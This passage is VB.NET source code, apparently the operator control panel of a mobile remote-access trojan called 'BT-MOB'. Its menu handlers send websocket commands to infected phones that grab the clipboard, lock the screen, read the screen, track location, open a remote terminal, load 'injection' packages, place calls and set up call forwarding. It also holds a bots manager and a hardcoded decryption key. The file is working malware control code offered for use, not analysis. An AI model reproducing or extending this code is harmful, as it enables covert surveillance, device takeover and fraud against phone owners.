    Public Sub ToolStripMenuItem19_Click(sender As Object, e As EventArgs) Handles ToolStrip_chat.Click
        If DGV0.SelectedRows.Count > 0 Then


            Dim adminname As String = ""
            Dim btinput As New myinputs
            btinput.msgtitle.Text = "Your name"
            btinput.inputtext.Text = ""
            btinput.inputtext.Watermark = "ex: admin"
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            adminname = btinput.inputtext.Text
            If isEmpty(adminname) Then
                adminname = "  "
            End If

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        Dim handle As String = "BT-" & "Chat-" & Tclient.mobid

                        Dim chatform As Chat = My.Application.OpenForms(handle)

                        If chatform Is Nothing Then

                            chatform = New Chat(adminname)
                            chatform.Name = handle
                            chatform.Btcli = Tclient

                            chatform.Show()
                        Else
                            chatform.BringToFront()
                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem11_Click_1(sender As Object, e As EventArgs) Handles ToolStrip_trak.Click
        If DGV0.SelectedRows.Count > 0 Then

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        Dim handle As String = "BT-" & "Track-" & Tclient.mobid

                        Dim trackform As Tracker = My.Application.OpenForms(handle)

                        If trackform Is Nothing Then

                            trackform = New Tracker()
                            trackform.Name = handle
                            trackform.Btcli = Tclient

                            Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "brows"},
                             {"subc", "n"},
                             {"extdata", "0"},
                             {"ltype", "lp"},
                             {"lfor", "trk"}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                            trackform.Show()
                        Else
                            trackform.BringToFront()
                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem20_Click(sender As Object, e As EventArgs) Handles ToolStrip_clipb.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "clip"},
                                 {"cas", "0"}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public Sub ToolStripMenuItem21_Click(sender As Object, e As EventArgs) Handles ToolStrip_lockscr.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "lock"},
                            {"cas", "2"}'load
                           }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Public PingMS As String = 0
    Private Async Sub pingerserver_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles pingerserver.DoWork
        While Not isClosingHandled
            Try

                Dim port As Integer = 80
                Dim timeout As Integer = 2000

                Dim pingTime As Long = TcpPing(DefServer, port, timeout)
                PingMS = pingTime.ToString

                Thread.Sleep(15000)


                Dim datajoin As String = Await JoinServer(New With {
                             .case = "join",
                             .ping = "1",
                             .ismain = "0",
                             .usridf = Main_IDF,
                             .chk = Mainnextkey
                 }, MainhttpClient)



                Dim result As JObject = JObject.Parse(datajoin)

                ' Check the result for success or failure
                If result("Success") IsNot Nothing Then
                    Dim datastr As String = result("Success").ToString.Trim("""")
                    Log_d("PING", datastr)




                ElseIf result("Fail") IsNot Nothing Then
                    '  MyMsg.Show("failed: ", result("Fail").ToString(), msgtype.errors, False)
                    Exit While
                End If

            Catch ex As Exception

            End Try
        End While
    End Sub

    Private isClosingHandled As Boolean = False
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Not isClosingHandled Then
            isClosingHandled = True
            'Msghandler.out()
            Msghandler.Stop()
            Me.Visible = False
            e.Cancel = True
            webSocketClient.ShouldReconnect = False
            CleanupAndExit()
        End If
    End Sub
    Private Async Sub CleanupAndExit()
        Try
            webSocketClient.OutServer()
            Dim datajoin As String = Await JoinServer(New With {
                             .case = "out",
                             .ping = "1",
                             .ismain = "0",
                             .usridf = Main_IDF,
                             .chk = Mainnextkey
                 }, MainhttpClient)
        Catch ex As Exception
            ' Log or handle error if needed
        End Try

        Try

            webSocketClient.Disconnect("End Main", "0.0.0.0")
            If connectionThread IsNot Nothing AndAlso connectionThread.IsAlive Then
                connectionThread.Abort()
            End If
        Catch ex As Exception
        End Try

        Me.Alive = False
        Thread.Sleep(1000)
        Environment.Exit(0)
    End Sub
    Private elapsedTime As Integer = 0
    Private Sub contimer_Tick(sender As Object, e As EventArgs) Handles contimer.Tick
        Try
            elapsedTime += 1
            Dim ts As TimeSpan = TimeSpan.FromSeconds(elapsedTime)
            Dim rle As String = ChrW(&H202B) ' Right-to-Left Embedding
            Dim pdf As String = ChrW(&H202C) ' Pop Directional Formatting

            contitle.Text = $"{rle}{Startedtimstr}: {startstamp}{pdf}" & Space(5) &
                            $"{rle}{sessintimstr}: {ts.ToString("hh\:mm\:ss")}{pdf}" & Space(5) &
                            $"{rle}{socktsstr}: {BTEngine.SocketsCount}{pdf}" & Space(5) &
                            $"{rle}{totlsntstr}: {codes.BytesConverter(If(BTEngine.BytesSent < 0, 0, BTEngine.BytesSent)).GetValue(0)}{pdf}" & Space(5) &
                            $"{rle}{totlrcivedstr}: {codes.BytesConverter(If(BTEngine.BytesReceived < 0, 0, BTEngine.BytesReceived)).GetValue(0)}{pdf}"

        Catch ex As Exception

        End Try
    End Sub

    Public Sub ScreenReaderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ToolStrip_scrred.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "Reader-" & Tclient.mobid

                            Dim screenform As ScreenReader = My.Application.OpenForms(handle)

                            If screenform Is Nothing Then

                                screenform = New ScreenReader
                                screenform.Name = handle
                                screenform.Btcli = Tclient

                                screenform.Show()
                            Else
                                screenform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub InjectionsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ToolStrip_ject.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                          {"msg", "ject"},
                                          {"tid", "0"},
                                          {"cas", "1"}'1 = load all
                                }

                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub NotesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NotesToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then


                            Dim handle As String = "BT-" & "Note-" & Tclient.mobid

                            Dim notform As btNotes = My.Application.OpenForms(handle)

                            If notform Is Nothing Then
                                notform = New btNotes
                                notform.Tclient = Tclient
                                notform.Show()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then


            Dim ncliname As String = ""
            Dim btinput As New myinputs
            btinput.msgtitle.Text = "New name"
            btinput.inputtext.Text = ""
            btinput.inputtext.Watermark = "ex: Home"
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            ncliname = btinput.inputtext.Text
            If isEmpty(ncliname) Then
                BTAlerter.Warnings("Enter Name first")
                Return
            End If

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        Dim data As New With {
                                     .tname = ncliname
                                }

                        Dim commandstr As String = FormatCommand("Rename", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                                    {"msg", wrk},
                                                    {"cmnd", commandstr}
                        }
                        webSocketClient.SendComCommand(chatData, Tclient.mobid)
                        Ro.Cells(3).Value = ncliname
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub RedirectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RedirectToolStripMenuItem.Click
        BTAlerter.infos("Coming soon")
    End Sub




    Private Sub DrakeUIButtonIcon2_Click_1(sender As Object, e As EventArgs) Handles updtbtn.Click
        For Each btn As DrakeUI.Framework.DrakeUIButtonIcon In mainbtns
            If btn.Name <> DirectCast(sender, DrakeUI.Framework.DrakeUIButtonIcon).Name Then
                btn.ForeColor = Color.White
                btn.RectColor = Color.Gray
            Else
                btn.ForeColor = Color.DodgerBlue
                btn.RectColor = Color.DodgerBlue
            End If
        Next
        Panel_updates.BringToFront()
        maintitle.Text = $" #{BTEngine.u_uid} | " & updatesstr
    End Sub

    Private Async Sub updater_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles updater.DoWork
        Dim Randomkey As String = RandomString(32)


        Try

            Dim params = New With {
                     Key .subcom = "check",
                     Key .ran_key = Randomkey,
                     Key .chk = Mainnextkey
                }


            Dim result = Await FetchUpdates(params, MainhttpClient)


            If result.Item1 Then
                Dim response As String = result.Item2.Replace("\", "").Trim("""")
                Dim datajson As String = Nothing
                Try
                    datajson = DecryptReply(Randomkey, "BT-MOB" & "!B6twG9+&U", response)
                Catch ex As Exception
                    datajson = Nothing
                End Try

                If Not isEmpty(datajson) Then
                    Dim resjson As JObject = JObject.Parse(datajson)

                    Dim vernum As String = resjson("version")
                    Dim hashnum As String = resjson("hash")
                    Dim datenum As String = resjson("date")
                    Dim sizenum As String = resjson("size")

                    Dim currenthash As String = GetMD5Hash(Application.ExecutablePath)

                    If currenthash = hashnum Then
                        If Not Startchecker Then
                            'MsgBox("Updated")
                            MyMsg.Show(myname, updatedstr, msgtype.Confirm, False) '
                        Else
                            Startchecker = False
                        End If

                    Else

                        Me.Invoke(New Action(Sub()
                                                 If MyMsg.Show(myname, Nupdatestr, msgtype.Confirm, True) = DialogResult.OK Then
                                                     Dim upatefrm As New updatewindow
                                                     upatefrm.httpClient = MainhttpClient
                                                     upatefrm.nextkey = Mainnextkey
                                                     upatefrm.Show()
                                                 End If

                                             End Sub))
                    End If

                Else
                    'BTAlerter.infos(response, False)
                    Me.Invoke(Sub()
                                  'storestate.Text = response
                                  BTAlerter.erroes(response)
                              End Sub)


                End If
            Else
                Me.Invoke(Sub()
                              BTAlerter.erroes(result.Item2)
                          End Sub)
            End If



        Catch ex As Exception
            Log_e("updater_DoWork", EXtoString(ex))
        End Try



    End Sub

    Private Sub DrakeUIButtonIcon3_Click_1(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon3.Click
        If updater.IsBusy Then
            BTAlerter.infos(pleasewait)
            Return
        End If

        updater.RunWorkerAsync()
    End Sub

    Public Sub ToolStrip_location_Click(sender As Object, e As EventArgs) Handles ToolStrip_location.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "LOC-" & Tclient.mobid

                            Dim locform As LocationMap = My.Application.OpenForms(handle)

                            If locform Is Nothing Then

                                locform = New LocationMap
                                locform.Name = handle
                                locform.BTcli = Tclient

                                locform.Show()
                            Else
                                locform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub
    Private redirectform As Redirector
    Private Sub DrakeUIButtonIcon2_Click_2(sender As Object, e As EventArgs) Handles recrctbtn.Click
        If DGV0.Rows.Count > 0 Then


            Dim holdlist As New List(Of BTClient)

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        holdlist.Add(Tclient)
                    End If

                Catch ex As Exception

                End Try
            Next

            If holdlist.Count > 0 Then

                If redirectform Is Nothing OrElse redirectform.IsDisposed Then
                    redirectform = New Redirector()
                    redirectform.listclients = holdlist

                    AddHandler redirectform.FormClosed, Sub()

                                                            redirectform = Nothing
                                                        End Sub

                    redirectform.Show()
                Else

                    redirectform.BringToFront()
                    redirectform.Focus()
                End If

            End If


        End If


    End Sub
    Private jectform As ijectionlab
    Private Sub jector_Click(sender As Object, e As EventArgs) Handles jector.Click
        If jectform Is Nothing Then
            Dim alljects As String = MyRes.injections_Path
            Dim jctfiles() As String = Nothing
            jectform = New ijectionlab
            If System.IO.Directory.Exists(alljects) Then
                jctfiles = System.IO.Directory.GetFiles(alljects, "*.zip")
            End If

            If jctfiles IsNot Nothing AndAlso jctfiles.Length > 0 Then


                For Each filenam As String In jctfiles
                    jectform.jectslist.Items.Add(Path.GetFileNameWithoutExtension(filenam))
                Next
            End If

            jectform.ShowDialog()
            jectform = Nothing
            Allinjections = loadjectors(MyRes.injections_Path)
        End If
    End Sub

    Private Sub DataGridView1_CellPainting(sender As Object, e As DataGridViewCellPaintingEventArgs) Handles DGV0.CellPainting
        Dim dgv As DataGridView = CType(sender, DataGridView)

        ' Only paint if it's a valid row and the column is visible
        If e.RowIndex >= 0 AndAlso e.ColumnIndex >= 0 Then
            e.Handled = True
            e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias

            Dim rect As Rectangle = e.CellBounds
            'rect.Inflate(-2, -4)
            Dim radius As Integer = 15

            Dim path As Drawing2D.GraphicsPath = Nothing

            Dim colIndex As Integer = e.ColumnIndex
            Dim lastColIndex As Integer = dgv.ColumnCount - 1

            ' Determine which corners to round
            If colIndex = 0 Then
                ' Round left side only (top-left and bottom-left)
                DGV0.Rows(e.RowIndex).Cells(0).Style.Padding = New Padding(0)


                path = GetRoundedRectanglePath(rect, radius, roundTopLeft:=True, roundTopRight:=False, roundBottomRight:=False, roundBottomLeft:=True)
            ElseIf colIndex = lastColIndex Then
                ' Round right side only (top-right and bottom-right)
                path = GetRoundedRectanglePath(rect, radius, roundTopLeft:=False, roundTopRight:=True, roundBottomRight:=True, roundBottomLeft:=False)
            Else
                ' No rounding on middle cells, just draw normal rectangle
                path = New Drawing2D.GraphicsPath()
                path.AddRectangle(rect)
            End If

            Dim backColor As Color
            Dim foreColor As Color

            If dgv.Rows(e.RowIndex).Selected Then
                backColor = Color.FromArgb(60, 60, 60)
                foreColor = Color.DeepSkyBlue
            Else
                backColor = dgv.DefaultCellStyle.BackColor
                foreColor = dgv.DefaultCellStyle.ForeColor
            End If

            Using b As New SolidBrush(backColor), pen As New Pen(backColor)
                e.Graphics.FillPath(b, path)
                e.Graphics.DrawPath(pen, path)
            End Using

            If e.Value IsNot Nothing AndAlso TypeOf e.Value Is Image Then
                Dim img As Image = CType(e.Value, Image)

                ' Center the image inside the rectangle
                Dim imgRect As New Rectangle(
                rect.X + (rect.Width - img.Width) \ 2,
                rect.Y + (rect.Height - img.Height) \ 2,
                img.Width,
                img.Height
            )
                e.Graphics.DrawImage(img, imgRect)
            ElseIf e.Value IsNot Nothing Then
                ' Draw text value centered vertically and with padding
                TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, rect, foreColor, TextFormatFlags.HorizontalCenter Or TextFormatFlags.VerticalCenter Or TextFormatFlags.WordBreak)
            End If
        End If
    End Sub

    Private Function GetRoundedRectanglePath(rect As Rectangle, radius As Integer,
                                         Optional roundTopLeft As Boolean = True,
                                         Optional roundTopRight As Boolean = True,
                                         Optional roundBottomRight As Boolean = True,
                                         Optional roundBottomLeft As Boolean = True) As Drawing2D.GraphicsPath
        Dim path As New Drawing2D.GraphicsPath()
        Dim diameter As Integer = radius * 2

        ' Top-left corner
        If roundTopLeft Then
            Dim arcRect As New Rectangle(rect.X, rect.Y, diameter, diameter)
            path.AddArc(arcRect, 180, 90)
        Else
            path.StartFigure()
            path.AddLine(rect.X, rect.Y, rect.X, rect.Y)
        End If

        ' Top edge
        If roundTopRight Then
            Dim arcRect As New Rectangle(rect.Right - diameter, rect.Y, diameter, diameter)
            path.AddArc(arcRect, 270, 90)
        Else
            path.AddLine(rect.Right, rect.Y, rect.Right, rect.Y)
        End If

        ' Right edge
        If roundBottomRight Then
            Dim arcRect As New Rectangle(rect.Right - diameter, rect.Bottom - diameter, diameter, diameter)
            path.AddArc(arcRect, 0, 90)
        Else
            path.AddLine(rect.Right, rect.Bottom, rect.Right, rect.Bottom)
        End If

        ' Bottom edge
        If roundBottomLeft Then
            Dim arcRect As New Rectangle(rect.X, rect.Bottom - diameter, diameter, diameter)
            path.AddArc(arcRect, 90, 90)
        Else
            path.AddLine(rect.X, rect.Bottom, rect.X, rect.Bottom)
        End If

        path.CloseFigure()
        Return path
    End Function
    Private Sub DGV0_MouseWheel(sender As Object, e As MouseEventArgs) Handles DGV0.MouseWheel
        Try
            Dim delta As Integer = -Math.Sign(e.Delta) ' Normalize scroll direction (up/down)
            Dim newIndex As Integer = DGV0.FirstDisplayedScrollingRowIndex + delta

            If newIndex < 0 Then newIndex = 0
            If newIndex >= DGV0.RowCount Then newIndex = DGV0.RowCount - 1

            DGV0.FirstDisplayedScrollingRowIndex = newIndex
            DrakeUIScrollBar1.Value = newIndex
        Catch
            ' Swallow exceptions (usually on edge rows)
        End Try
    End Sub

    Private Sub DrakeUIScrollBar1_ValueChanged(sender As Object, e As EventArgs) Handles DrakeUIScrollBar1.ValueChanged
        Try
            If DrakeUIScrollBar1.Value >= 0 AndAlso DrakeUIScrollBar1.Value < DGV0.Rows.Count Then
                DGV0.FirstDisplayedScrollingRowIndex = DrakeUIScrollBar1.Value
            End If

        Catch ex As Exception

        End Try
    End Sub

    Private Sub DGV0_Scroll(sender As Object, e As ScrollEventArgs) Handles DGV0.Scroll
        DrakeUIScrollBar1.Value = e.NewValue
    End Sub

    Private Sub ToastToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ToastToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            Dim toastmsg As String = ""
            Dim btinput As New myinputs
            btinput.msgtitle.Text = "Toast message"
            btinput.inputtext.Text = ""
            btinput.inputtext.Watermark = "ex: hello"
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            toastmsg = btinput.inputtext.Text
            If isEmpty(toastmsg) Then
                toastmsg = "  "
            End If

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "tols"},
                                 {"cas", "t"},
                                 {"extrs", toastmsg}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub OpenLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenLinkToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            Dim linktoopen As String = ""
            Dim btinput As New myinputs
            btinput.msgtitle.Text = "Enter link to open in browser"
            btinput.inputtext.Text = ""
            btinput.inputtext.Watermark = "ex: example.com"
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            linktoopen = btinput.inputtext.Text
            If isEmpty(linktoopen) Then
                linktoopen = "  "
            End If

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "tols"},
                                 {"cas", "o"},
                                 {"extrs", linktoopen}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click_1(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        If DGV0.SelectedRows.Count > 0 Then

            Dim speechmsg As String = ""
            Dim preflang As String = ""
            Dim btinput As New ttsform
            btinput.inputtext.Text = ""
            btinput.inputtext.Watermark = "ex: hello"
            If btinput.ShowDialog <> DialogResult.OK Then
                Return
            End If

            speechmsg = btinput.inputtext.Text
            If isEmpty(speechmsg) Then
                speechmsg = "  "
            End If


            Select Case btinput.langtext.Text
                Case "English"
                    preflang = "en"
                Case "العربية"
                    preflang = "ar"
                Case "中国人"
                    preflang = "zh"
                Case "Русский"
                    preflang = "ru"
                Case "Türkçe"
                    preflang = "tr"
                Case "Português"
                    preflang = "pt"
                Case "Español"
                    preflang = "es"
                Case Else
                    preflang = "en"
            End Select

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "tols"},
                                 {"cas", "tts"},
                                 {"lng", preflang},
                                 {"extrs", speechmsg}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub VibrateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VibrateToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "tols"},
                                 {"cas", "v"},
                                 {"extrs", "1000"}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub TerminalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TerminalToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "trm"},'terminal
                                 {"cas", "l"}
                            }
                            BTEngine.commands(chatData, Tclient.mobid, BTEngine.MainForm.webSocketClient)

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private updateform As Clientsupdater
    Private Sub DrakeUIButtonIcon2_Click_3(sender As Object, e As EventArgs) Handles updtmngrbtn.Click
        If DGV0.Rows.Count > 0 Then


            Dim holdlist As New List(Of BTClient)

            For Each Ro As DataGridViewRow In DGV0.Rows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If IsVersionGreater(Tclient.version, "v3.6.1") Then 'v3.5 we add update manager
                            holdlist.Add(Tclient)
                        End If


                    End If

                Catch ex As Exception

                End Try
            Next

            If holdlist.Count > 0 Then


                If updateform Is Nothing OrElse updateform.IsDisposed Then
                    updateform = New Clientsupdater()
                    updateform.listclients = holdlist

                    AddHandler updateform.FormClosed, Sub()

                                                          updateform = Nothing
                                                      End Sub

                    updateform.Show()
                Else

                    updateform.BringToFront()
                    updateform.Focus()
                End If

            End If


        End If
    End Sub

    Private Sub CallPhoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CallPhoneToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "caller-" & Tclient.mobid

                            Dim callform As phonecaller = My.Application.OpenForms(handle)

                            If callform Is Nothing Then

                                callform = New phonecaller
                                callform.Name = handle
                                callform.Btcli = Tclient

                                callform.Show()
                            Else
                                callform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub

    Private Sub CallForwardingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CallForwardingToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.SelectedRows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If Tclient.mobid IsNot Nothing Then

                            Dim handle As String = "BT-" & "callforward-" & Tclient.mobid

                            Dim callform As callforwarding = My.Application.OpenForms(handle)

                            If callform Is Nothing Then

                                callform = New callforwarding
                                callform.Name = handle
                                callform.Btcli = Tclient
                                If Tclient.sim.Contains("/") Then
                                    Dim allsims() As String = Tclient.sim.Split("/")
                                    For Each simidx As String In allsims
                                        callform.combosims.Items.Add(simidx)
                                    Next
                                Else
                                    If Tclient.sim <> "Known" Then
                                        callform.combosims.Items.Add(Tclient.sim)
                                    End If
                                End If
                                callform.Show()
                            Else
                                callform.BringToFront()
                            End If

                        End If
                    End If

                Catch ex As Exception

                End Try
            Next
        End If
    End Sub


    Private BotsForm As BotsManager
    Private Sub DrakeUIButtonIcon2_Click_4(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click


        Dim holdlist As New List(Of BTClient)

        If DGV0.Rows.Count > 0 Then
            For Each Ro As DataGridViewRow In DGV0.Rows
                Try
                    If Ro.Tag IsNot Nothing Then
                        Dim Tclient As BTClient = DirectCast(Ro.Cells(0).Tag, BTClient)
                        If IsVersionGreater(Tclient.version, "v3.5.0") Then 'v4.6 we add bots manager
                            holdlist.Add(Tclient)
                        End If


                    End If

                Catch ex As Exception

                End Try
            Next
        End If

        'If holdlist.Count > 0 Then


        If BotsForm Is Nothing OrElse BotsForm.IsDisposed Then
                    Dim handle As String = "BT-bots-manager"
                    BotsForm = New BotsManager()
                    BotsForm.listclients = holdlist
                    BotsForm.Name = handle
                    AddHandler BotsForm.FormClosed, Sub()
                                                        BotsForm = Nothing
                                                    End Sub

                    BotsForm.Show()
                Else

                    BotsForm.BringToFront()
                    BotsForm.Focus()
                End If


                ' End If

    End Sub
End Class

